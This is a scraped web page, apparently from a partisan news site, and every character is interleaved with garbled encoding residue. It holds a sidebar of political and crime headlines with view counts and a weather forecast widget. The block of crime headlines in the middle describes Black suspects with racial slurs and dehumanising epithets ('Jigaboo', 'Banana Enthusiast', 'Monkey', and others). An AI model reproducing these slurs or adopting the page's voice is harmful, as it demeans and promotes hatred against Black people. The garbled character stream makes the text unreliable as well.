B‚Äéi‚Äéd‚Äée‚Äén‚Äé:‚Äé ‚ÄéT‚Äéh‚Äér‚Äée‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äée‚Äéd‚Äé,‚Äé ‚Äé‚Äò‚ÄéM‚Äéa‚Äén‚Äéy‚Äé‚Äô‚Äé ‚ÄéW‚Äéo‚Äéu‚Äén‚Äéd‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéD‚Äér‚Äéo‚Äén‚Äée‚Äé ‚ÄéA‚Äét‚Äét‚Äéa‚Äéc‚Äék‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé:‚Äé ‚ÄéT‚Äéh‚Äér‚Äée‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äée‚Äéd‚Äé,‚Äé ‚Äé‚Äò‚ÄéM‚Äéa‚Äén‚Äéy‚Äé‚Äô‚Äé ‚ÄéW‚Äéo‚Äéu‚Äén‚Äéd‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéD‚Äér‚Äéo‚Äén‚Äée‚Äé ‚ÄéA‚Äét‚Äét‚Äéa‚Äéc‚Äék‚Äé
6‚Äé,‚Äé7‚Äé5‚Äé9‚Äé
T‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äét‚Äéo‚Äé ‚ÄéA‚Äép‚Äép‚Äée‚Äéa‚Äél‚Äé ‚ÄéE‚Äé.‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé ‚ÄéC‚Äéa‚Äér‚Äér‚Äéo‚Äél‚Äél‚Äé ‚ÄéR‚Äéu‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚Äé'‚ÄéI‚Äén‚Äés‚Äéa‚Äén‚Äée‚Äé'‚Äé ‚ÄéC‚Äéo‚Äén‚Äéf‚Äél‚Äéi‚Äéc‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äée‚Äés‚Äét‚Äé
T‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äét‚Äéo‚Äé ‚ÄéA‚Äép‚Äép‚Äée‚Äéa‚Äél‚Äé ‚ÄéE‚Äé.‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé ‚ÄéC‚Äéa‚Äér‚Äér‚Äéo‚Äél‚Äél‚Äé ‚ÄéR‚Äéu‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚Äé'‚ÄéI‚Äén‚Äés‚Äéa‚Äén‚Äée‚Äé'‚Äé ‚ÄéC‚Äéo‚Äén‚Äéf‚Äél‚Äéi‚Äéc‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äée‚Äés‚Äét‚Äé
5‚Äé,‚Äé6‚Äé2‚Äé4‚Äé
L‚Äéa‚Äéb‚Äéo‚Äéu‚Äér‚Äé ‚ÄéM‚ÄéP‚Äé ‚ÄéS‚Äéu‚Äés‚Äép‚Äée‚Äén‚Äéd‚Äée‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéC‚Äéo‚Äém‚Äép‚Äéa‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéW‚Äéa‚Äér‚Äé ‚Äéi‚Äén‚Äé ‚ÄéG‚Äéa‚Äéz‚Äéa‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéH‚Äéo‚Äél‚Äéo‚Äéc‚Äéa‚Äéu‚Äés‚Äét‚Äé
L‚Äéa‚Äéb‚Äéo‚Äéu‚Äér‚Äé ‚ÄéM‚ÄéP‚Äé ‚ÄéS‚Äéu‚Äés‚Äép‚Äée‚Äén‚Äéd‚Äée‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéC‚Äéo‚Äém‚Äép‚Äéa‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéW‚Äéa‚Äér‚Äé ‚Äéi‚Äén‚Äé ‚ÄéG‚Äéa‚Äéz‚Äéa‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéH‚Äéo‚Äél‚Äéo‚Äéc‚Äéa‚Äéu‚Äés‚Äét‚Äé
1‚Äé1‚Äé7‚Äé
F‚Äéa‚Äén‚Äéi‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äés‚Äé ‚ÄéD‚Äée‚Äéf‚Äée‚Äén‚Äéd‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚ÄéN‚Äéa‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚ÄéW‚Äéa‚Äéd‚Äée‚Äé,‚Äé ‚ÄéS‚Äét‚Äéo‚Äén‚Äée‚Äéw‚Äéa‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéJ‚Äéi‚Äém‚Äé ‚ÄéJ‚Äéo‚Äér‚Äéd‚Äéa‚Äén‚Äé ‚ÄéP‚Äér‚Äéo‚Äéb‚Äée‚Äé
7‚Äé0‚Äé8‚Äé
R‚Äée‚Äép‚Äéu‚Äéb‚Äél‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚ÄéS‚Äél‚Äéa‚Äém‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéT‚Äér‚Äéo‚Äéo‚Äép‚Äé ‚ÄéD‚Äée‚Äéa‚Äét‚Äéh‚Äés‚Äé:‚Äé ‚Äé'‚ÄéL‚Äée‚Äéf‚Äét‚Äé ‚ÄéO‚Äéu‚Äér‚Äé ‚ÄéT‚Äér‚Äéo‚Äéo‚Äép‚Äés‚Äé ‚Äéa‚Äés‚Äé ‚ÄéS‚Äéi‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚Äéu‚Äéc‚Äék‚Äés‚Äé'‚Äé
R‚Äée‚Äép‚Äéu‚Äéb‚Äél‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚ÄéS‚Äél‚Äéa‚Äém‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéT‚Äér‚Äéo‚Äéo‚Äép‚Äé ‚ÄéD‚Äée‚Äéa‚Äét‚Äéh‚Äés‚Äé:‚Äé ‚Äé'‚ÄéL‚Äée‚Äéf‚Äét‚Äé ‚ÄéO‚Äéu‚Äér‚Äé ‚ÄéT‚Äér‚Äéo‚Äéo‚Äép‚Äés‚Äé ‚Äéa‚Äés‚Äé ‚ÄéS‚Äéi‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚Äéu‚Äéc‚Äék‚Äés‚Äé'‚Äé
5‚Äé,‚Äé6‚Äé6‚Äé0‚Äé
T‚Äéw‚Äéo‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äéc‚Äéu‚Äés‚Äét‚Äéo‚Äéd‚Äéy‚Äé ‚Äéa‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äéa‚Äé ‚Äén‚Äée‚Äéw‚Äéb‚Äéo‚Äér‚Äén‚Äé ‚Äéb‚Äéa‚Äéb‚Äéy‚Äé ‚Äég‚Äéi‚Äér‚Äél‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéf‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äéb‚Äée‚Äéh‚Äéi‚Äén‚Äéd‚Äé ‚Äéd‚Äéu‚Äém‚Äép‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéa‚Äét‚Äé ‚Äéa‚Äé ‚ÄéM‚Äéi‚Äés‚Äés‚Äéi‚Äés‚Äés‚Äéi‚Äép‚Äép‚Äéi‚Äé ‚Äém‚Äéo‚Äéb‚Äéi‚Äél‚Äée‚Äé ‚Äéh‚Äéo‚Äém‚Äée‚Äé ‚Äép‚Äéa‚Äér‚Äék‚Äé ‚Äél‚Äéa‚Äés‚Äét‚Äé ‚Äéw‚Äée‚Äée‚Äék‚Äé,‚Äé ‚Äéo‚Äéf‚Äéf‚Äéi‚Äéc‚Äéi‚Äéa‚Äél‚Äés‚Äé ‚Äés‚Äéa‚Äéi‚Äéd‚Äé.‚Äé
N‚Äée‚Äéw‚Äéb‚Äéo‚Äér‚Äén‚Äé ‚ÄéF‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚ÄéB‚Äée‚Äéh‚Äéi‚Äén‚Äéd‚Äé ‚ÄéM‚Äéi‚Äés‚Äés‚Äéi‚Äés‚Äés‚Äéi‚Äép‚Äép‚Äéi‚Äé ‚ÄéD‚Äéu‚Äém‚Äép‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé,‚Äé ‚ÄéT‚Äéw‚Äéo‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äéu‚Äés‚Äét‚Äéo‚Äéd‚Äéy‚Äé
2‚Äé6‚Äé6‚Äé
1‚Äé5‚Äé ‚ÄéF‚Äéa‚Äéc‚Äét‚Äés‚Äé ‚ÄéA‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚ÄéE‚Äé.‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé ‚ÄéC‚Äéa‚Äér‚Äér‚Äéo‚Äél‚Äél‚Äé'‚Äés‚Äé ‚ÄéC‚Äéa‚Äés‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéM‚Äée‚Äéd‚Äéi‚Äéa‚Äé ‚ÄéD‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚ÄéW‚Äéa‚Äén‚Äét‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äét‚Äéo‚Äé ‚ÄéK‚Äén‚Äéo‚Äéw‚Äé
1‚Äé5‚Äé ‚ÄéF‚Äéa‚Äéc‚Äét‚Äés‚Äé ‚ÄéA‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚ÄéE‚Äé.‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé ‚ÄéC‚Äéa‚Äér‚Äér‚Äéo‚Äél‚Äél‚Äé'‚Äés‚Äé ‚ÄéC‚Äéa‚Äés‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéM‚Äée‚Äéd‚Äéi‚Äéa‚Äé ‚ÄéD‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚ÄéW‚Äéa‚Äén‚Äét‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äét‚Äéo‚Äé ‚ÄéK‚Äén‚Äéo‚Äéw‚Äé
1‚Äé4‚Äé,‚Äé4‚Äé2‚Äé0‚Äé
L‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé:‚Äé ‚Äé'‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äée‚Äét‚Äé ‚ÄéR‚Äéu‚Äém‚Äéo‚Äér‚Äés‚Äé'‚Äé ‚ÄéD‚Äér‚Äéi‚Äév‚Äéi‚Äén‚Äég‚Äé ‚ÄéB‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚ÄéD‚Äée‚Äéa‚Äél‚Äé ‚ÄéS‚Äék‚Äée‚Äép‚Äét‚Äéi‚Äéc‚Äés‚Äé
L‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé:‚Äé ‚Äé'‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äée‚Äét‚Äé ‚ÄéR‚Äéu‚Äém‚Äéo‚Äér‚Äés‚Äé'‚Äé ‚ÄéD‚Äér‚Äéi‚Äév‚Äéi‚Äén‚Äég‚Äé ‚ÄéB‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚ÄéD‚Äée‚Äéa‚Äél‚Äé ‚ÄéS‚Äék‚Äée‚Äép‚Äét‚Äéi‚Äéc‚Äés‚Äé
6‚Äé3‚Äé1‚Äé
M‚Äéu‚Äés‚Äél‚Äéi‚Äém‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äéh‚Äéi‚Äéc‚Äéa‚Äég‚Äéo‚Äé ‚ÄéS‚Äéu‚Äéb‚Äéu‚Äér‚Äéb‚Äé ‚ÄéC‚Äéh‚Äéa‚Äér‚Äég‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéM‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéW‚Äéi‚Äéf‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äé3‚Äé ‚ÄéD‚Äéa‚Äéu‚Äég‚Äéh‚Äét‚Äée‚Äér‚Äés‚Äé
M‚Äéu‚Äés‚Äél‚Äéi‚Äém‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äéh‚Äéi‚Äéc‚Äéa‚Äég‚Äéo‚Äé ‚ÄéS‚Äéu‚Äéb‚Äéu‚Äér‚Äéb‚Äé ‚ÄéC‚Äéh‚Äéa‚Äér‚Äég‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéM‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéW‚Äéi‚Äéf‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äé3‚Äé ‚ÄéD‚Äéa‚Äéu‚Äég‚Äéh‚Äét‚Äée‚Äér‚Äés‚Äé
6‚Äé5‚Äé7‚Äé
O‚Äék‚Äél‚Äéa‚Äéh‚Äéo‚Äém‚Äéa‚Äé ‚ÄéG‚ÄéO‚ÄéP‚Äé ‚ÄéE‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚Äéu‚Äép‚Äép‚Äéo‚Äér‚Äét‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéL‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéP‚Äél‚Äéa‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚ÄéE‚Äéx‚Äép‚Äéa‚Äén‚Äéd‚Äé ‚ÄéI‚Äém‚Äém‚Äéi‚Äég‚Äér‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé
O‚Äék‚Äél‚Äéa‚Äéh‚Äéo‚Äém‚Äéa‚Äé ‚ÄéG‚ÄéO‚ÄéP‚Äé ‚ÄéE‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚Äéu‚Äép‚Äép‚Äéo‚Äér‚Äét‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéL‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéP‚Äél‚Äéa‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚ÄéE‚Äéx‚Äép‚Äéa‚Äén‚Äéd‚Äé ‚ÄéI‚Äém‚Äém‚Äéi‚Äég‚Äér‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé

N‚Äée‚Äég‚Äér‚Äéo‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéN‚Äée‚Äég‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéS‚Äéi‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äé2‚Äé0‚Äé1‚Äé7‚Äé ‚ÄéL‚Äéo‚Äén‚Äég‚Äéb‚Äéo‚Äéa‚Äét‚Äé ‚ÄéD‚Äéo‚Äéu‚Äéb‚Äél‚Äée‚Äé ‚ÄéM‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äé.‚Äé

S‚Äéo‚Äém‚Äée‚Äét‚Äéi‚Äém‚Äée‚Äés‚Äé,‚Äé ‚Äém‚Äéy‚Äé ‚Äéf‚Äér‚Äéy‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äéa‚Äén‚Äé ‚Äéi‚Äés‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äéw‚Äéo‚Äér‚Äék‚Äée‚Äéd‚Äé.‚Äé


N‚Äée‚Äég‚Äér‚Äéo‚Äé ‚ÄéC‚Äéa‚Äér‚Äée‚Äée‚Äér‚Äé ‚ÄéC‚Äér‚Äéi‚Äém‚Äéi‚Äén‚Äéa‚Äél‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéN‚ÄéY‚ÄéC‚Äé ‚ÄéS‚Äéu‚Äéb‚Äéw‚Äéa‚Äéy‚Äé ‚ÄéS‚Äét‚Äéa‚Äéb‚Äéb‚Äéi‚Äén‚Äég‚Äés‚Äé.‚Äé


K‚Äéa‚Äél‚Äéa‚Äém‚Äéa‚Äéz‚Äéo‚Äéo‚Äé ‚ÄéC‚Äéo‚Äéo‚Äén‚Äé ‚ÄéF‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚ÄéG‚Äéu‚Äéi‚Äél‚Äét‚Äéy‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéM‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äé.‚Äé


J‚Äéi‚Äég‚Äéa‚Äéb‚Äéo‚Äéo‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéo‚Äét‚Äés‚Äé ‚ÄéM‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéo‚Äéf‚Äé ‚Äé3‚Äé ‚Äét‚Äéo‚Äé ‚ÄéD‚Äée‚Äéa‚Äét‚Äéh‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚ÄéV‚ÄéS‚Äé ‚ÄéP‚Äéa‚Äér‚Äék‚Äéi‚Äén‚Äég‚Äé ‚ÄéL‚Äéo‚Äét‚Äé.‚Äé


E‚Äéa‚Äés‚Äét‚Äé ‚ÄéH‚Äéa‚Äér‚Äél‚Äée‚Äém‚Äé:‚Äé ‚ÄéP‚Äér‚Äée‚Äéh‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéi‚Äéc‚Äé ‚ÄéA‚Äép‚Äée‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéF‚Äéu‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äé1‚Äé0‚Äé-‚ÄéY‚Äée‚Äéa‚Äér‚Äé-‚ÄéO‚Äél‚Äéd‚Äé ‚ÄéH‚Äée‚Äé ‚ÄéM‚Äée‚Äét‚Äé ‚ÄéV‚Äéi‚Äéa‚Äé ‚ÄéD‚Äéa‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéA‚Äép‚Äép‚Äé.‚Äé


B‚Äéa‚Äén‚Äéa‚Äén‚Äéa‚Äé ‚ÄéE‚Äén‚Äét‚Äéh‚Äéu‚Äés‚Äéi‚Äéa‚Äés‚Äét‚Äé ‚ÄéG‚Äée‚Äét‚Äés‚Äé ‚Äé2‚Äé7‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéG‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚ÄéQ‚Äéu‚Äée‚Äée‚Äén‚Äés‚Äé ‚ÄéS‚Äét‚Äéa‚Äéb‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚ÄéS‚Äép‚Äér‚Äée‚Äée‚Äé.‚Äé


M‚Äéo‚Äén‚Äék‚Äée‚Äéy‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéA‚Äéb‚Äéu‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéT‚Äéu‚Äér‚Äét‚Äél‚Äée‚Äé ‚Äéa‚Äét‚Äé ‚ÄéW‚Äéh‚Äéa‚Äél‚Äée‚Äé ‚ÄéB‚Äér‚Äéa‚Äén‚Äéc‚Äéh‚Äé ‚ÄéE‚Äéa‚Äér‚Äél‚Äéy‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚ÄéS‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé.‚Äé


M‚Äéu‚Äél‚Äéa‚Äét‚Äét‚Äéo‚Äé ‚ÄéB‚Äéi‚Äét‚Äéc‚Äéh‚Äé ‚ÄéG‚Äée‚Äét‚Äés‚Äé ‚Äé2‚Äé6‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéH‚Äée‚Äér‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚ÄéM‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéS‚Äét‚Äéu‚Äéf‚Äéf‚Äéi‚Äén‚Äég‚Äé ‚ÄéH‚Äée‚Äér‚Äé ‚ÄéB‚Äéo‚Äéd‚Äéy‚Äé ‚Äéi‚Äén‚Äé ‚ÄéS‚Äéu‚Äéi‚Äét‚Äéc‚Äéa‚Äés‚Äée‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚Äé‚òÅÔ∏è.‚Äé

T‚Äéo‚Äéd‚Äéa‚Äéy‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
7‚Äé0‚Äé¬∞‚Äé
/‚Äé4‚Äé3‚Äé¬∞‚Äé
2‚Äé%‚Äé
S‚ÄéW‚Äé ‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé9‚Äé ‚Äé|‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé
7‚Äé0‚Äé¬∞‚Äé
2‚Äé%‚Äé
S‚ÄéW‚Äé
8‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äés‚Äéh‚Äéi‚Äén‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äé ‚Äéf‚Äée‚Äéw‚Äé ‚Äéa‚Äéf‚Äét‚Äée‚Äér‚Äén‚Äéo‚Äéo‚Äén‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äés‚Äé.‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äén‚Äée‚Äéa‚Äér‚Äé ‚Äé7‚Äé0‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚ÄéW‚Äé ‚Äéa‚Äét‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
5‚Äé6‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
5‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéu‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
7‚Äé:‚Äé2‚Äé2‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äés‚Äée‚Äét‚Äé
6‚Äé:‚Äé0‚Äé4‚Äé ‚Äép‚Äém‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé9‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
4‚Äé3‚Äé¬∞‚Äé
4‚Äé%‚Äé
S‚ÄéW‚Äé
5‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äém‚Äéo‚Äér‚Äée‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äé4‚Äé3‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚Äél‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äév‚Äéa‚Äér‚Äéi‚Äéa‚Äéb‚Äél‚Äée‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
7‚Äé4‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
9‚Äé:‚Äé4‚Äé4‚Äé ‚Äép‚Äém‚Äé
W‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéG‚Äéi‚Äéb‚Äéb‚Äéo‚Äéu‚Äés‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
9‚Äé:‚Äé4‚Äé2‚Äé ‚Äéa‚Äém‚Äé
T‚Äéu‚Äée‚Äé ‚Äé3‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé1‚Äé¬∞‚Äé
/‚Äé4‚Äé1‚Äé¬∞‚Äé
4‚Äé%‚Äé
W‚ÄéS‚ÄéW‚Äé ‚Äé6‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé3‚Äé1‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé1‚Äé¬∞‚Äé
/‚Äé4‚Äé6‚Äé¬∞‚Äé
5‚Äé%‚Äé
N‚ÄéE‚Äé ‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé0‚Äé1‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé9‚Äé¬∞‚Äé
/‚Äé5‚Äé5‚Äé¬∞‚Äé
9‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé0‚Äé2‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé3‚Äé¬∞‚Äé
/‚Äé5‚Äé7‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé0‚Äé3‚Äé
A‚ÄéM‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
6‚Äé7‚Äé¬∞‚Äé
/‚Äé4‚Äé8‚Äé¬∞‚Äé
8‚Äé4‚Äé%‚Äé
W‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé0‚Äé4‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
6‚Äé6‚Äé¬∞‚Äé
/‚Äé4‚Äé5‚Äé¬∞‚Äé
1‚Äé%‚Äé
W‚ÄéN‚ÄéW‚Äé ‚Äé1‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
